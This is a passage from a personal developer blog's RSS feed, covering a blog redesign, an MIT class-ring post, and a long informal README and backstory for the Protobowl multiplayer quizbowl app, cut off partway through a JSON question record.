      <description>&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;this blog&quot;  src=&quot;/articles/2015/Blog%20Reboot/2015-04-25.png&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md right&quot; style=&quot;width: 200px&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2015/Blog%20Reboot/construction.gif&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;This is my submission to blogdom’s burgeoning class of eternally “work in progress” sites. I’ve been working on this blog reboot for nearly a year at this point (rest assured, I haven’t worked on it for any appreciable fraction of that time— but it’s nonetheless traumatizing for me as “blog posts written” is my primary metric for personal productivity). &lt;/p&gt;
&lt;p&gt;There’s still a lot left to be done, but right now it should be in a more or less functional and navigable state. I’ve just added image thumbnailing (so this homepage shouldn’t take a triassic aeon to load anymore), which seems like an addition substantial-enough to warrant some new words adorning the featured post callout.&lt;/p&gt;
&lt;p&gt;Most importantly though, it’s now a hip static site hosted on Github Pages (though I might move to S3), so the Turkish phishers last remaining venue for hijacking this site may be sending a pull request. &lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;more&quot;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;getting-hacked&quot;&gt;Getting Hacked&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;http://antimatter15.com/2014/06/blog-hacked/&quot;&gt;&lt;div class=&quot;pic md right&quot; style=&quot;width: 300px&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2015/Blog%20Reboot/paypal-medium.jpg&quot; &gt;&lt;div class=&quot;caption&quot;&gt;I unwittingly invited some consultants work on the new blog design, but all they could come up with was clearly somewhat unoriginal...&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I don’t generally pay a lot of attention to this blog— especially during the beginning of every month. I used to generally hold myself to a rule that I would post something new at least once a month, but that policy kept slipping and then there was a mad dash to finish some blog post the first or second day of each new month to be retroactively timestamped. &lt;/p&gt;
&lt;p&gt;Anyway, point is that I didn’t notice when the site got hacked for a few days. Unfortunately I don’t have any screenshots of what the site looked like when it was hacked. And at this point I can’t promise you that my mental model of what it looked like is anything more than a hallucination. &lt;/p&gt;
&lt;p&gt;It’s a bit of an interesting chapter in my blog’s history, so I’ve spun off this section &lt;a href=&quot;http://antimatter15.com/2014/06/blog-hacked/&quot;&gt;into its own post&lt;/a&gt;.&lt;/p&gt;
&lt;h3 id=&quot;first-sketches&quot;&gt;First Sketches&lt;/h3&gt;
&lt;p&gt;&lt;div class=&quot;pic md right&quot; style=&quot;width: 200px&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2015/Blog%20Reboot/firstsketch-medium.jpg&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;I guess it makes a reasonable amount of sense to write about how this site works. This is the first incarnation of the blog which is to any appreciable extent aesthetically original. It isn’t the default theme of JupiterCMS, PHPFusion, nor is it a free template for Wordpress. &lt;/p&gt;
&lt;p&gt;It’s a pretty simple design, and it’s pretty nifty that in this day and age, a design which is sparse by ignorance is indestinguishable from a good design which is sparse by (uh) design. There isn’t much besides the simple arrangement of rectangles and lines and it relies pretty heavily on typography and whitespace to delimit sections. &lt;/p&gt;
&lt;p&gt;At around the same time my blog stopped working, I came into the posession of a Moleskine. On June 14th, apparently, I started my first sketch of what my blog might be like. &lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md right&quot; style=&quot;width: 200px&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2015/Blog%20Reboot/ideas-medium.jpg&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;In retrospect, it didn’t really look very coherent and I have literally no idea what I was trying to do at the time. But one of the motivations behind the entire endeavor was to strike a sort of balance between a blog and a portfolio. I like the idea of documenting the process of things and writing some part of the though process a somewhat non-abbreviated form. But one thing that I noticed is that a blog is a terrible means of surfacing older content, and I think a lot of the interesting ideas I’ve explored are the ones which I played around with several years ago. &lt;/p&gt;
&lt;p&gt;On the other spectrum, I didn’t want to go too far in the direction of summary. I didn’t quite want it to be simply a résumé where I condense every endeavor into two buzzword-packed sentences which summarize the little iota of cleverness imbued in the project. &lt;/p&gt;
&lt;p&gt;And so the motivation of the design was finding some way to hybridize the two goals— summary and process. &lt;/p&gt;
&lt;p&gt;I found another sketch in my Moleskine dated June 24th, which seems to be a bit more coherent. On the right you can see some blocks and lines which, while not having much bearing on the current site design, at least seem like they might pass a Turing test criterion for sufficiently-websiteish website.&lt;/p&gt;
&lt;p&gt;One thing that I noticed is that the sequence of my projects tends to be pretty structured. Over the years, I tend to explore little ideas which tend to culminate into singular projects— or alternatively, I build a larger project and spin off smaller components. All of this tends to happen over a relatively short time period (a few months to a year). &lt;/p&gt;
&lt;p&gt;So in terms of a projects list, this means that I can introduce a bit of an aesthetic cadence where a series of minor projects are occasionally punctuated by larger projects. And because of this natural faux-hierarchy there’s a natural clustering which is generally both temporal and subjective. The short projects have single-sentence summaries, whereas the larger projects can have a paragraph worth of elaboration.&lt;/p&gt;
&lt;p&gt;Naturally, all the project descriptions are hyperlinked and lead to a project page which includes all the blog posts documenting the process of creating that particular project. &lt;/p&gt;
&lt;h3 id=&quot;new-tools&quot;&gt;New Tools&lt;/h3&gt;
&lt;p&gt;At some point I helped design a mobile app and ended up getting reasonably familiar with Adobe Illustrator. &lt;/p&gt;
&lt;p&gt;It was also at this time that I started using tools that designers use— things like &lt;a href=&quot;http://www.adobe.com/products/illustrator.html&quot;&gt;Adobe Illustrator&lt;/a&gt; and &lt;a href=&quot;http://bohemiancoding.com/sketch/&quot;&gt;Bohemian Coding’s Sketch&lt;/a&gt;. &lt;/p&gt;
</description>
    </item>
    <item>
      <title>Brass Doge</title>
      <link>http://antimatter15.com/2015/04/brass-doge/</link>
      <pubDate>Thu, 09 Apr 2015 23:35:01 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2015/04/brass-doge/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2015/Brass%20Doge/doge.png&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;“We are stuck with technology when what we really want is just stuff that works.” — Douglas Adams&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md right&quot; style=&quot;width: 300px&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2015/Brass%20Doge/ring-medium.jpg&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;At MIT we get a class ring called the “brass rat”. It’s rather amusing that the ring is neither made of brass, nor features a rat. It’s actually Gold, and features our mascot— the beaver. &lt;/p&gt;
</description>
    </item>
    <item>
      <title>Protobowl: Real-Time Multiplayer Online Quizbowl</title>
      <link>http://antimatter15.com/2014/12/protobowl-real-time-multiplayer-online-quizbowl/</link>
      <pubDate>Sun, 28 Dec 2014 04:25:54 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2014/12/protobowl-real-time-multiplayer-online-quizbowl/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;div class=&quot;pic md right&quot; style=&quot;width: 300px&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2014/Protobowl/protobowl-medium.jpg&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;I guess it’s a trivia site and I’m never actually going to legitimately finish this README, as it’s substantially over 3,000 words and I haven’t even finished the introduction to the prequel. I might as well distill the whole thing down to what actually matters— the little bits of trivia that really don’t matter but might be amusing to some people with particularly derranged senses of amusement.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;The official about page says that Protobowl is a portmanteau of “Prototype Quizbowl Application”, but this is in fact a lie. It is in fact and has always been an acronym for Promoting Racism Online To Obstruct Better Organized World Leadership. It was always designed to be nothing less than a &lt;a href=&quot;http://www.qbwiki.com/wiki/index.php?title=Protobowl&amp;amp;oldid=22538&quot;&gt;“literal cancer of the quizbowl community”&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Protobowl’s live-as-you-type real time chat was inspired by Google Wave, which Kevin is quite embarassed to have spent the first half of high school playing with, almost as embarrassed as he feels right now writing about himself in third person.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Protobowl was going to have a social component (called Socialbowl) so that users could log in and view their scores and detailed performance stats with graphs depicting buzz rates per category. Ben stopped working on it before it launched, so it was never added.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Protobowl runs primarily on Nodejitsu, but falls back to a Bitcable VPS, and then to an MIT XVM if all hell breaks loose. In late 2012, Ben and I had a bet over whether or not he would get into the Science Honor Society, and whoever lost would have to pay for the operational costs of Protobowl for the rest of time. He got accepted and lost the bet.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;For a long time (and probably still today, albeit hopefully less so), Protobowl suffered from a mysterious lag problem that we could never quite figure out. In the process of debugging it, we instituted a bunch of voodoo superstitious policies under semi-credible conjectures. For the possibility that it might be due to increasing memory pressure due to a small memory leak, Protobowl restarts every day at 4am EST every day. The time was chosen because it represents the time of day with the fewest online users.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Protobowl has a built-in chat bot which is the remanant of a chat bot I had built in middle school for Omegle. It can be triggered by going into any empty room and saying (in chat) “I’m lonely”. It’s mostly reflective of the hornier, angstier and shallower side of online chat rooms, so it’s unlikely to pass a turing test (even if it decides to answer “asl” with “18 f uk”. &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Protobowl was made using Twitter Bootstrap, which for quite a while was the blandest theme you could find on the internet because everyone who couldn’t design thought it looked beautiful. But now Bootstrap has itself become enamored with flat design, and Protobowl looks clean and original again with its soft gradients and gentle rounded corners. &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Protobowl stores active rooms in-memory as simple Javascript objects. Inactive rooms are saved in a MongoDB database so that they can be unfrozen when requested. Questions are stored in an entirely separate MongoDB database. &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;version-3&quot;&gt;Version 3&lt;/h2&gt;
&lt;p&gt;The current version of Protobowl which lies before you is the “third” version. By that, I mean these version numbers don’t mean much more than significant changes to the core of protobowl. Version 3 constituted more or less an entire rewrite to the codebase with specific attention paid to offline-first and abstracting away the socket layer. The result is something which is, at least architecturally, pretty cool. A rather large amount of code is shared between client and server, such that the transition between online and offline and back is super seamless.&lt;/p&gt;
&lt;h1 id=&quot;readme-anachronisms&quot;&gt;README &amp;amp; Anachronisms&lt;/h1&gt;
&lt;p&gt;Okay, so I think NPM would complain if I didn’t have a readme, so I guess I’ll start writing something which might be mistaken for a readme given a certain number of prior conditions. As you might figure out in the “Prototype Quizbowl Application” section, the core of protobowl has evolved significantly during the life of this readme, and especially because I’m so insistent on writing pseudo-literary fluff in lieu of helpful concise manuals and bullets, there’s a good chance that the vast majority of the readme will be rife with anachronisms, statements that once were true, were falsified, returned to truthfulness and then fell into a stasis of untruth. &lt;/p&gt;
&lt;h1 id=&quot;manual&quot;&gt;Manual&lt;/h1&gt;
&lt;p&gt;Okay, so this application probably ranks among one of the largest things I’ve ever done, which actually does say something as to its scope. However, it’s still designed to be fast and responsive and what not.&lt;/p&gt;
&lt;p&gt;But it’s got a somewhat large scope which makes me believe that it may be useful to have a sort of overview not of how things work (that’s what the code is for), but a somewhat deeper look into what it does. What kinds of features and little tricks.&lt;/p&gt;
&lt;h2 id=&quot;responsive-design&quot;&gt;Responsive Design&lt;/h2&gt;
&lt;p&gt;Yeah, yeah, buzzwords galore. It’s responsively designed which means that it should, at least in theory, work on all screen sizes, from gigantic monitor walls of 60 HD displays (I’ve only tested the application on six WXQGA monitors) to an iPhone screen (I won’t venture any smaller, because running on watches represents a significant effort beyond what I already have).&lt;/p&gt;
&lt;p&gt;It’s been tested on a few browsers, Chrome (on Linux, Windows, iPad, Galaxy Nexus) and Firefox and Safari on iPad. &lt;/p&gt;
&lt;p&gt;It’s built with Twitter Bootstrap, sans fugly black bar on top, so it should inherit most of the responsiveness. Also, it uses Font Awesome for all glyphs and that means everything’s vector and smooth even at absurd pixel densities.&lt;/p&gt;
&lt;h2 id=&quot;offline&quot;&gt;Offline&lt;/h2&gt;
&lt;p&gt;Protobowl was designed first with a flexible sync architecture. However, regrettably, it wasn’t designed with the idea of Offline-first. Don’t get me wrong, offline works great, but it’s implemented with a offline.coffee which is largely (I’d say 80%) a reimplementation of methods in web.coffee. That’s not a good quantity of don’t repeat yourself, or at least it’s hardly ideal.&lt;/p&gt;
&lt;p&gt;However, by virtue of running off Node, there’s a single language (javascript) which runs both client and server. As such there’s a natural ability to reuse some code, in this case, all the supporting libraries are shared between client and server, the answer checking (which is surprisingly sophisticated, albeit likely unnecessarily so). &lt;/p&gt;
&lt;p&gt;Offline was built with Appcache in mind, that’s pretty obvious because you sort of need appcache to make things work offline. The offline code is loaded asynchronously and there isn’t any fundamental difference between offline-start and disconnect behavior. So that means there isn’t any fumbling between multiple copies of the code or any limitation on the functionality of the offline mode. You can disconnect from the server in the midst of the game, perhaps because of a flaky connection and you can continue without interruption. And it even tries to automatically reconnect, and picks up the state and resumes (albeit, probably losing what you’ve done offline).&lt;/p&gt;
&lt;p&gt;I have a sort of wordsy packrat syndrome, so I’ll leave all the text above untarnished, and state plainly that none of the words above are true, not anymore at least. Version 3 was a rewrite of the entire core of protobowl: client, server, heaven and earth. And to make the architecture more clean and gody, I endeavored to share code between client and server in a pretty cool way.&lt;/p&gt;
&lt;p&gt;I don’t think this is meant to be a technical exposé of the artistic symmetries in the yet-unmade UML diagram of the universe, but I’ll talk about it a bit anyway, at least long enough for this document to hit the 3000 word mark. &lt;/p&gt;
&lt;h2 id=&quot;interface&quot;&gt;Interface&lt;/h2&gt;
&lt;p&gt;This is what I really think matters, how to actually use it, and the little interaction features.&lt;/p&gt;
&lt;h3 id=&quot;keyboard&quot;&gt;Keyboard&lt;/h3&gt;
&lt;p&gt;The primary interface is meant to be the keyboard. In fact, early design sketches didn’t even include a button bar for the desktop UI. Eventually, I relented, and there’s now buttons, but still, use keyboards.&lt;/p&gt;
&lt;p&gt;The first button is &lt;code&gt;space&lt;/code&gt;, which make sense because it’s the biggest button and also probably the most important. Space generally means “buzz”, however there’s another very small thing it does: when you open up and see that big green button saying “start the game”, you can also press space to trigger that (no ambiguity since the buzz button is disabled in such circumstances).&lt;/p&gt;
&lt;p&gt;Next, or skipping, as it was referred to in earlier iterations, is also a fairly commonplace operation. It can be accessed with not one, but three keys, &lt;code&gt;S&lt;/code&gt;, &lt;code&gt;N&lt;/code&gt; and &lt;code&gt;J&lt;/code&gt;. &lt;code&gt;S&lt;/code&gt; and &lt;code&gt;N&lt;/code&gt; are probably pretty obvious, referring to “Skip” and “Next”. J is just convenient because it’s on the home row (well, so is &lt;code&gt;S&lt;/code&gt;, technically) and usually refers to “down” for people who use Vi or Vim, although it is commonplace for websites to respect &lt;code&gt;j&lt;/code&gt; meaning up, and &lt;code&gt;k&lt;/code&gt; meaning down. (See: Facebook, all Google products, etc.)&lt;/p&gt;
&lt;p&gt;You can pause and resume with &lt;code&gt;P&lt;/code&gt; and &lt;code&gt;R&lt;/code&gt;. Both are equivalent, so you can technically pause with &lt;code&gt;R&lt;/code&gt;, and resume with &lt;code&gt;P&lt;/code&gt;, though that would be metaphorically confusing. &lt;/p&gt;
&lt;p&gt;Since it’s designed to be “social”, if you don’t mind me tossing around more loaded buzzwords, chat was one of the first features added (also one of the easiest, but that doesn’t help me rewrite history). Chat is accessed through the &lt;code&gt;/&lt;/code&gt; key, that is, the forward slash or by pressing enter while not buzzed. For those who don’t like letters which aren’t in the alphabet, it’s also accessible through the letter &lt;code&gt;C&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&quot;buttons&quot;&gt;Buttons&lt;/h3&gt;
&lt;p&gt;Yeah, buttons, they exist. But they’re only meant to be used on mobile. Seriously, use your keyboard.&lt;/p&gt;
&lt;h3 id=&quot;other-things-you-can-click-on&quot;&gt;Other things you can click on&lt;/h3&gt;
&lt;p&gt;There are a number of non-button things which can be clicked on as well.&lt;/p&gt;
&lt;h4 id=&quot;breadcrumbs&quot;&gt;Breadcrumbs&lt;/h4&gt;
&lt;p&gt;The “breadcrumb”, as Bootstrap calls it, is the little row which precedes every question which includes the category, difficulty and tournament to which the question belongs. The one on the top isn’t clickable, but all the other ones are. Clicking on those expands the question readout which gets collapsed below them.&lt;/p&gt;
&lt;p&gt;Within the breadcrumb is a slightly grayed out word “Report”, which can be clicked on to bring up a (currently non-functional) modal dialog to submit a question for manual review in case there was something wrong with the question. For instance, maybe the question was formatted wrong or truncated, or you’re exceedingly pedantic and think that there is a typo which hinders your ability to participate, or something.&lt;/p&gt;
&lt;p&gt;Also, on the far right is a blue star which can be clicked on to “bookmark” a question. Right now, bookmarking does little other than filling in that blue star and preventing the question from getting deleted (questions that drop far enough down get deleted unless they’re bookmarked). However, in the future, it may be imaginable that the bookmarked questions would be added to some kind of interface which could be managed by the server.&lt;/p&gt;
&lt;p&gt;The breadcrumb also reveals the answer to the question whenever the question is over.&lt;/p&gt;
&lt;h4 id=&quot;leaderboard-statistics&quot;&gt;Leaderboard/Statistics&lt;/h4&gt;
&lt;p&gt;In multiplayer mode, there is a leaderboard showing a ranking of all the users who have participated in the room. In single player, it’s just a single grid giving your statistics.&lt;/p&gt;
&lt;h5 id=&quot;multiplayer&quot;&gt;Multiplayer&lt;/h5&gt;
&lt;p&gt;It’s a grid, which is pretty cool, the first row is the ranking and the score, the latter of which is inside a bubble which is colored. The score is at the moment computed based on the number of “early” answers, which are correct answers before the asterisk in applicable packets, the number of interrupts and the number of correct answers. The current weights are 15 for an early answer, 10 for a correct answer and -5 for an interrupt. The colors of the bubble denote the online status of the player:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;gray&lt;/code&gt; the user is offline and has no connected sessions at that moment&lt;/li&gt;
&lt;li&gt;&lt;code&gt;orange&lt;/code&gt; the user has not interacted with the game in the past 10 minutes, but has at least one session open&lt;/li&gt;
&lt;li&gt;&lt;code&gt;green&lt;/code&gt; the user is online and has interacted with the room in the past 10 minutes&lt;/li&gt;
&lt;li&gt;&lt;code&gt;blue&lt;/code&gt; this row corresponds to you&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;On the adjacent column is the user’s name and there is another column for the number of interrupts. There aren’t any more because there isn’t much space.&lt;/p&gt;
&lt;p&gt;Clicking on any of the rows brings up a popover which gives a more complete breakdown of the user and his or her performance. That dialog can be dismissed by clicking (or tapping, for touch devices) again on the same row.&lt;/p&gt;
&lt;h5 id=&quot;single-player-offline&quot;&gt;Single Player/Offline&lt;/h5&gt;
&lt;p&gt;The single player mode has aesthetic similarities to the detailed popover of the multiplayer mode and this is hardly a coincidence. The default view for single player mode is just an abridged version of the popover’s view including only the score, the number correct, the number of interrupts and the total number of guesses. Clicking on the single player interface anywhere will reveal the more detailed interface (with purty sliding effects courtesy of jQuery).&lt;/p&gt;
&lt;p&gt;On the single player header the “offline” badge lights up, well, quite obviously, when the user is offline.&lt;/p&gt;
&lt;p&gt;It also has shiny transitions between single player and multiplayer modes.&lt;/p&gt;
&lt;h2 id=&quot;debugging&quot;&gt;Debugging&lt;/h2&gt;
&lt;p&gt;The debugging panel is the furthest down and takes the form of what looks like a table. The first two rows sound vaguely technical (with an underscore too!), latency and sync_offset. And you’d be right, they’re both just little metrics which go indicate the health of the network connection. &lt;/p&gt;
&lt;p&gt;The titling of “Debugging” is a tad disingenuous, it’s mostly networking. But then again, networking is like the vast majority of what can actually fail. &lt;/p&gt;
&lt;p&gt;The very last in the menu is a link that quite plainly says “Disconnect”, and opposite is a piece of text representing the application cache’s status. Disconnect is nice for when the network’s flakey and you know your connection won’t last long anyway. Or if you’re like antisocial and need to make your own little corner to cry in. Or something like that. Sure. Okay. Next.&lt;/p&gt;
&lt;h3 id=&quot;the-main-interface&quot;&gt;The Main Interface&lt;/h3&gt;
&lt;p&gt;I think I’m going to start over with this manual.&lt;/p&gt;
&lt;h1 id=&quot;blog-post&quot;&gt;Blog Post&lt;/h1&gt;
&lt;p&gt;For the past few weeks, I’ve been working on a project which was tentatively titled “Protobowl”, short for “Prototype Quizbowl Application”. And that probably suffices as some sort of cursory description of what it is, it’s an app which tries to mimic the experience of a quiz bowl competition online. Most importantly, it was designed for multiplayer from day one.&lt;/p&gt;
&lt;h2 id=&quot;backstory&quot;&gt;Backstory&lt;/h2&gt;
&lt;p&gt;The github page for this project was created two weeks ago at time of writing, but the history of the project actually extends much further back. For the past two years, I’ve been a member of my school’s quiz bowl team, not a particularly illustrious team, but like any non-dysfunctional organization, we do have a sense of enthusiasm for the game. I’ve wanted to do something which had something to do with it for a while, but never found a sufficient impetus to do it until late in May.&lt;/p&gt;
&lt;p&gt;On May 25th of this year, I was introduced to the website quizbowldb.com which has a pretty cool question reader. My friend, who belongs to a team which is significantly better (as an understatement) was using that tool to prepare for a tournament. I spent a few minutes looking at the site and felt mildly disappointed that multiplayer didn’t work, but at least I found some niche that was worth catering to.&lt;/p&gt;
&lt;h3 id=&quot;bayesian-classifier&quot;&gt;Bayesian Classifier&lt;/h3&gt;
&lt;p&gt;The first thing which needed to be done was getting some set of labeled questions for the database. I looked around and found a few sources but most of them weren’t really large or labeled. I had finished the online AI class a few months ago, and felt like applying it in a fairly obvious scenario, so over the course of the next few hours I built a simple naive bayesian classifier to give categories to questions. &lt;/p&gt;
&lt;p&gt;But, in order to do that, I had to first have some manually labeled corpus. I certainly wasn’t up for the tedium, so I decided to pull some from the quizbowldb.com site to seed the algorithm. At that point in time, for some reason, I was using some preview release of Windows 8 and rather regrettably couldn’t use wget. But I coped by writing a short python script (rather than the more reasonable solution of rebooting into another operating system) which would incrementally clone the site’s database. &lt;/p&gt;
&lt;p&gt;Because of rate limiting or something to that effect, the script only pulled about 10 questions every 40 seconds, and given that there were 30,000 questions in the database, the process wasn’t terribly fast. I eventually booted back into linux and rewrote the script so that it was resumable (for the event that the script might be interrupted for some reason on its scheduled week-long run). &lt;/p&gt;
&lt;p&gt;However, by the next day, some number of them were downloaded and that small number was enough to train the classifier. The first thing was trying to run the classifier on the question set itself and comparing how well it fared. The results were actually surprisingly good, and after careful combing through the exceptions, it appeared that most of the errors manifested from the manual mislabeling of the original corpus. &lt;/p&gt;
&lt;p&gt;After that initial successful result, I did a bit of work on a question extraction algorithm which would use the command line version of Abiword to convert .doc and .docx files that packets are usually distributed as into some machine readable format for feeding into the classifier. However, I never quite finished that, as school work caught up with me and I waited for the database to finish downloading.&lt;/p&gt;
&lt;h3 id=&quot;hiatus&quot;&gt;Hiatus&lt;/h3&gt;
&lt;p&gt;On June 7th, about two weeks after I built the first promising prototype of the question parser, I had noticed that the background task had finished. Actually, it finished something like a week earlier, but I hadn’t noticed. Lurking around through Wikipedia, I discovered that Roger Craig, the famed Jeopardy! contestant who wrote a program to help study had actually attended my high school.&lt;/p&gt;
&lt;p&gt;But nothing really happened after that. The school year was nearing a close and the after school clubs were having their last meetings of the year. There was the standardized testing and the anxiety about the imminent end of the year, and I had other projects which seemed more enticing at the time. Narrower in scope and more doable in shorter periods of time. This app was always on the radar, it just gradually slipped further and further back.&lt;/p&gt;
&lt;h3 id=&quot;it-s-ac-attack&quot;&gt;It’s Ac Attack&lt;/h3&gt;
&lt;p&gt;I wasn’t the only person in my school’s quiz bowl team who was interested in pursuing the idea. In fact, it was Ben who actually started the app first. I didn’t write code for the actual project until two weeks ago.&lt;/p&gt;
&lt;p&gt;Early in July (or possibly late in June), Ben wanted to build that quiz bowl application when I was still working on a few other projects as well as an internship. I gave him the big JSON file of questions and he toiled away for the next few days, experimenting first with Ruby on Rails and then later settling with Node.JS (and the accompanying popular stacks). &lt;/p&gt;
&lt;p&gt;Within a few days, he had put out a pretty impressive application using Mongoose, Jade, Twitter Bootstrap, Express, and Node running on Heroku at the (now defunct) its-ac-attack URL. Soon afterwards search was fairly functional and I started to take an interest in the project again (having almost finished another project, though at time of writing, I have yet to begin writing the blog post for that project).&lt;/p&gt;
&lt;p&gt;I felt like exploiting this opportunity to get acquainted somewhat with popular NodeJS frameworks and tools. I haven’t done much with Node for over two years, and the landscape has changed considerably in the intervening years. It’s a fast growing and developing community. However, I never really found interest in building the entire app. Managing users and doing search has always struck me as somewhat boring, in part because it’s hardly untreaded territory.&lt;/p&gt;
&lt;p&gt;I wanted to skip straight into the low latency websocket-driven synchronized multiplayer. Ben was still acclimating to the multimodal (if I’m using these buzzwords right) paradigm of writing code meant to be executed on both the client and the server, so I decided to prototype a multiplayer environment.&lt;/p&gt;
&lt;h2 id=&quot;prototype-quizbowl-application&quot;&gt;Prototype Quizbowl Application&lt;/h2&gt;
&lt;p&gt;Chronologically, this places us at about two weeks ago. That’s actually quite confusing because I wrote that sentence a bit over a month ago, where “a month ago” means August 8th, and “now” means September 12th. That is, you can imagine the gap between the first sentence in this paragraph and the sentence immediately succeeding it as joined by that scene from Monty Python where the animator dies of some fatal heart attack, in which case that animator is me, and I just sort of gave up on writing the readme. &lt;/p&gt;
&lt;p&gt;And just like that, in the blink of a sentence, it’s been another month. &lt;/p&gt;
&lt;h2 id=&quot;question-set-management-via-github&quot;&gt;Question Set Management via Github&lt;/h2&gt;
&lt;p&gt;Folder Structure:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='mathematica'&gt;&lt;/span&gt;qb/
    &lt;span class=&quot;hljs-number&quot;&gt;2013&lt;/span&gt;/
        ACF Nationals/
            &lt;span class=&quot;hljs-keyword&quot;&gt;Round&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;
            &lt;span class=&quot;hljs-keyword&quot;&gt;Round&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;
            &lt;span class=&quot;hljs-keyword&quot;&gt;Round&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;
            &lt;span class=&quot;hljs-keyword&quot;&gt;Round&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here’s what the JSON is like from Mongo&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='json'&gt;&lt;/span&gt;{ &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;__v&lt;/span&gt;&quot; : &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;, &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;_id&lt;/span&gt;&quot; : &lt;span class=&quot;hljs-value&quot;&gt;{ &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;$oid&lt;/span&gt;&quot; : &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-string&quot;&gt;&quot;506e3e938b3d831d6a000001&quot;&lt;/span&gt; &lt;/span&gt;}&lt;/span&gt;, &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;answer&lt;/span&gt;&quot; : &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-string&quot;&gt;&quot;The {Bronze Horseman}: A Petersburg Tale [accept The Copper Horseman or Mednyy vsadnik: Peterburgskaya povest’]&quot;&lt;/span&gt;&lt;/span&gt;, &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;category&lt;/span&gt;&quot; : &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-string&quot;&gt;&quot;Literature&quot;&lt;/span&gt;&lt;/span&gt;, &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;difficulty&lt;/span&gt;&quot; : &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-string&quot;&gt;&quot;Open&quot;&lt;/span&gt;&lt;/span&gt;, &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;fixed&lt;/span&gt;&quot; : &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;, &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;inc_random&lt;/span&gt;&quot; : &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-number&quot;&gt;53.99425264270977&lt;/span&gt;&lt;/span&gt;, &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;num&lt;/span&gt;&quot; : &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;, &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;question&lt;/span&gt;&quot; : &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;/span&gt;, &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;round&lt;/span&gt;&quot; : &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-string&quot;&gt;&quot;2011-ACFNationals-BrownFinal.doc&quot;&lt;/span&gt;&lt;/span&gt;, &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;seen&lt;/span&gt;&quot; : &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-number&quot;&gt;36&lt;/span&gt;&lt;/span&gt;, &quot;&lt;span 